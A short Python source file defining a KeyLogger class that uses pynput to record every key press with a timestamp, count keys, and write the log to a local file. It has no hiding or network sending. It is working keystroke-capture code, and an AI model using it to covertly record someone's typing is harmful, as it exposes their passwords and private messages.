"""All imports necessary to carry out this process"""
import pynput
from pynput import keyboard
from datetime import datetime
#from threading import Timer


class KeyLogger:
    def __init__(self):
        """The builder of the 'KeyLogger' class

        Class for creating keyloggers and controlling them.
        A keylogger stores the received input logs in a 'a_keys' list.
        The 'listener' attribute will allow us to listen to the keyboard.

        """
        self.a_keys = []
        self.a_listener = keyboard.Listener(on_press=self.on_press)

    def on_press(self,p_key):
        """Fills the list with a time and the key pressed."""
        log = ( datetime.now().time(), p_key )
        self.a_keys.append(log)
    
    def CountKey(self):
        """Return the number of keys pressed."""
        count = 0
        for key in self.a_keys:
            count +=1
        return count

    def getNumKeys(self,p_key):
        """Return the number of a given key (parameter)."""
        numKey = 0
        for i in self.a_keys:
            if p_key in str(i[1]):
                numKey +=1
        return numKey
       
    def write_on_file(self,p_filename):
        """Opens and fills a file with the list 'a_key'."""
        with open(p_filename,'w') as f:
            for key in self.a_keys:
                f.write(str(key))
                f.write("\n")
        f.close()
        
    def start(self):
        """Starts the keylogger"""
        self.a_listener.start()

    def stop(self):
        """Stops the keylogger"""
        self.a_listener.stop()
